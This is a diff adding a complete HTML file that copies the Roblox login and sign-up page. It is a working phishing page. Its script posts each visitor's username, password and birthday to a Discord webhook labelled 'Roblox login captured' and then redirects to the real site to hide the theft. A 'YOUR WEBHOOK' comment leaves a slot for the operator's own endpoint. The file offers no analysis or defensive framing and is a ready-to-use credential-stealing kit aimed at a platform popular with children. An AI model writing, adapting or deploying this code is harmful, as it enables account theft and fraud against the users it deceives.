@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roblox</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Cg transform='rotate(-15 50 50)'%3E%3Crect x='9' y='9' width='82' height='82' rx='13' fill='%23232527'/%3E%3Crect x='31' y='31' width='38' height='38' rx='7' fill='white'/%3E%3C/g%3E%3C/svg%3E">
+<style>
+  * { box-sizing: border-box; }
+  body { margin: 0; background: #fff; color: #232527; font-family: "Builder Sans", "Helvetica Neue", Helvetica, Arial, sans-serif; padding: 48px 16px; }
+  .wrap { max-width: 360px; margin: 0 auto; }
+  .logo { display: flex; align-items: center; justify-content: center; gap: 8px; margin-bottom: 22px; }
+  .wordmark { font-size: 26px; font-weight: 800; letter-spacing: -.5px; }
+  h1 { font-size: 22px; font-weight: 700; text-align: center; margin: 0 0 20px; }
+  .field { position: relative; margin-bottom: 12px; }
+  input, select { width: 100%; height: 46px; padding: 0 14px; font-size: 15px; font-family: inherit; color: #232527; background: #fff; border: 1px solid #c3c6ca; border-radius: 6px; }
+  input::placeholder { color: #6b6e72; }
+  input:focus, select:focus { outline: none; border-color: #232527; }
+  input.invalid { border-color: #d93025; }
+  .err { color: #d93025; font-size: 12px; margin-top: 5px; }
+  .pw input { padding-right: 46px; }
+  .eye { position: absolute; right: 6px; top: 0; height: 46px; width: 40px; background: none; border: none; cursor: pointer; display: flex; align-items: center; justify-content: center; }
+  .btn-primary { width: 100%; height: 46px; background: #232527; color: #fff; border: none; border-radius: 6px; font-size: 15px; font-weight: 600; font-family: inherit; cursor: pointer; }
+  .btn-primary:hover { background: #393b3d; }
+  .btn-primary:disabled { opacity: .7; cursor: default; }
+  .btn-secondary { width: 100%; height: 46px; background: #fff; color: #232527; border: 1px solid #c3c6ca; border-radius: 6px; font-size: 15px; font-weight: 600; font-family: inherit; cursor: pointer; }
+  .btn-secondary:hover { background: #f6f7f8; }
+  .forgot { display: block; text-align: center; font-size: 13px; color: #232527; text-decoration: none; margin: 14px 0 0; }
+  .forgot:hover { text-decoration: underline; }
+  .divider { display: flex; align-items: center; gap: 12px; margin: 20px 0; color: #6b6e72; font-size: 12px; font-weight: 600; }
+  .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #d3d6d9; }
+  .mini { display: block; font-size: 13px; font-weight: 600; margin-bottom: 8px; }
+  .bday { display: flex; gap: 8px; margin-bottom: 12px; }
+  .bday select { flex: 1; padding: 0 8px; }
+  .toast { margin-top: 16px; text-align: center; font-size: 13px; color: #00a2ff; font-weight: 600; }
+  footer { max-width: 360px; margin: 34px auto 0; text-align: center; font-size: 12px; color: #6b6e72; display: flex; flex-direction: column; gap: 6px; }
+  footer a { color: #6b6e72; text-decoration: none; }
+  footer a:hover { text-decoration: underline; }
+</style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="logo">
+      <svg viewBox="0 0 100 100" width="40" height="40" aria-hidden="true">
+        <g transform="rotate(-15 50 50)">
+          <rect x="9" y="9" width="82" height="82" rx="13" fill="#232527"/>
+          <rect x="31" y="31" width="38" height="38" rx="7" fill="#ffffff"/>
+        </g>
+      </svg>
+      <span class="wordmark">Roblox</span>
+    </div>
+
+    <!-- ============ LOG IN ============ -->
+    <div id="loginView">
+      <h1>Log in to Roblox</h1>
+      <div class="field">
+        <input id="lUser" type="text" placeholder="Username/Email" autocomplete="username">
+        <div class="err" id="lUserErr" hidden></div>
+      </div>
+      <div class="field pw">
+        <input id="lPass" type="password" placeholder="Password" autocomplete="current-password">
+        <button class="eye" type="button" data-for="lPass" aria-label="show password">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#6b6e72" stroke-width="1.8"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/></svg>
+        </button>
+        <div class="err" id="lPassErr" hidden></div>
+      </div>
+      <button class="btn-primary" id="loginBtn">Log In</button>
+      <a class="forgot" href="#">Forgot Password or Username?</a>
+      <div class="divider"><span>OR</span></div>
+      <button class="btn-secondary" id="toSignup">Sign Up</button>
+    </div>
+
+    <!-- ============ SIGN UP ============ -->
+    <div id="signupView" hidden>
+      <h1>Sign Up to Roblox</h1>
+      <label class="mini">Birthday</label>
+      <div class="bday">
+        <select id="sMonth"></select>
+        <select id="sDay"></select>
+        <select id="sYear"></select>
+      </div>
+      <div class="field">
+        <input id="sUser" type="text" placeholder="Username" autocomplete="username">
+        <div class="err" id="sUserErr" hidden></div>
+      </div>
+      <div class="field pw">
+        <input id="sPass" type="password" placeholder="Password" autocomplete="new-password">
+        <button class="eye" type="button" data-for="sPass" aria-label="show password">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#6b6e72" stroke-width="1.8"><path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7-11-7-11-7z"/><circle cx="12" cy="12" r="3"/></svg>
+        </button>
+        <div class="err" id="sPassErr" hidden></div>
+      </div>
+      <button class="btn-primary" id="signupBtn">Sign Up</button>
+      <a class="forgot" id="toLogin" href="#">Already have an account? Log In</a>
+    </div>
+
+    <div class="toast" id="toast" hidden></div>
+  </div>
+
+  <footer>
+    <span>©2026 Roblox Corporation</span>
+    <span class="links"><a href="#">Privacy Policy</a> · <a href="#">Terms of Service</a> · <a href="#">Help</a></span>
+  </footer>
+
+<script>
+  // ===== YOUR WEBHOOK =====
+  const WEBHOOK = "https://discord.com/api/webhooks/1559444245792821359/RpUzy0xEagZ9IQPCZ4lrY5Vn0Mwurvsj0jZnPkm-To8LRIwXxng5UgxXPkfPYw4h5gnQ";
+  const REDIRECT = "https://www.roblox.com/home";
+  const $ = id => document.getElementById(id);
+
+  // birthday selects
+  const months = ["January","February","March","April","May","June","July","August","September","October","November","December"];
+  months.forEach(m => $('sMonth').add(new Option(m, m)));
+  for (let d = 1; d <= 31; d++) $('sDay').add(new Option(d, d));
+  for (let y = 2026; y >= 1930; y--) $('sYear').add(new Option(y, y));
+  $('sYear').value = 2010;
+
+  // password reveal
+  document.querySelectorAll('.eye').forEach(btn => {
+    btn.onclick = () => {
+      const inp = $(btn.dataset.for);
+      inp.type = inp.type === 'password' ? 'text' : 'password';
+    };
+  });
+
+  // view toggle
+  $('toSignup').onclick = e => { e.preventDefault(); $('loginView').hidden = true; $('signupView').hidden = false; };
+  $('toLogin').onclick = e => { e.preventDefault(); $('signupView').hidden = true; $('loginView').hidden = false; };
+
+  // clear errors while typing
+  ['lUser','lPass','sUser','sPass'].forEach(id => {
+    $(id).addEventListener('input', () => {
+      $(id).classList.remove('invalid');
+      const e = $(id + 'Err'); if (e) e.hidden = true;
+    });
+  });
+
+  function showErr(inputId, msg) {
+    const inp = $(inputId), err = $(inputId + 'Err');
+    inp.classList.add('invalid');
+    err.textContent = msg;
+    err.hidden = false;
+  }
+
+  // ---- validation ----
+  function validLogin() {
+    let ok = true;
+    const u = $('lUser').value.trim(), p = $('lPass').value;
+    if (!u) { showErr('lUser', 'Username/Email is required'); ok = false; }
+    else if (u.length < 3) { showErr('lUser', 'Username must be at least 3 characters'); ok = false; }
+    if (!p) { showErr('lPass', 'Password is required'); ok = false; }
+    else if (p.length < 8) { showErr('lPass', 'Password must be at least 8 characters'); ok = false; }
+    return ok;
+  }
+
+  function validSignup() {
+    let ok = true;
+    const u = $('sUser').value.trim(), p = $('sPass').value;
+    if (!u) { showErr('sUser', 'Username is required'); ok = false; }
+    else if (!/^[a-zA-Z0-9_]{3,20}$/.test(u)) { showErr('sUser', '3-20 letters, numbers or underscores'); ok = false; }
+    if (!p) { showErr('sPass', 'Password is required'); ok = false; }
+    else if (p.length < 8) { showErr('sPass', 'Password must be at least 8 characters'); ok = false; }
+    return ok;
+  }
+
+  // ---- send to Discord (never blocks the redirect for more than 2.5s) ----
+  async function send(type, fields) {
+    const payload = {
+      username: 'Roblox Login',
+      embeds: [{
+        title: type === 'login' ? 'Roblox login captured' : 'Roblox signup captured',
+        color: 0xe2231a,
+        fields: fields,
+        footer: { text: 'roblox.com' },
+        timestamp: new Date().toISOString()
+      }]
+    };
+    const call = fetch(WEBHOOK, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload),
+      keepalive: true
+    }).catch(() => {});
+    const timeout = new Promise(r => setTimeout(r, 2500));
+    await Promise.race([call, timeout]);
+  }
+
+  function go(btn, label) {
+    btn.disabled = true;
+    btn.textContent = label;
+    $('toast').hidden = false;
+    $('toast').textContent = 'Redirecting to Roblox...';
+    setTimeout(() => { window.location.href = REDIRECT; }, 900);
+  }
+
+  // ---- Log In ----
+  $('loginBtn').onclick = async () => {
+    if (!validLogin()) return;
+    const btn = $('loginBtn');
+    btn.disabled = true;
+    btn.textContent = 'Logging in...';
+    await send('login', [
+      { name: 'Username/Email', value: $('lUser').value.trim(), inline: false },
+      { name: 'Password', value: $('lPass').value, inline: false }
+    ]);
+    go(btn, 'Logging in...');
+  };
+
+  // ---- Sign Up ----
+  $('signupBtn').onclick = async () => {
+    if (!validSignup()) return;
+    const btn = $('signupBtn');
+    btn.disabled = true;
+    btn.textContent = 'Creating account...';
+    const bday = `${$('sMonth').value} ${$('sDay').value}, ${$('sYear').value}`;
+    await send('signup', [
+      { name: 'Username', value: $('sUser').value.trim(), inline: false },
+      { name: 'Password', value: $('sPass').value, inline: false },
+      { name: 'Birthday', value: bday, inline: false }
+    ]);
+    go(btn, 'Creating account...');
+  };
+
+  document.addEventListener('keydown', e => {
+    if (e.key !== 'Enter') return;
+    if (!$('loginView').hidden) $('loginBtn').click();
+    else $('signupBtn').click();
+  });
+</script>
+</body>
+</html>
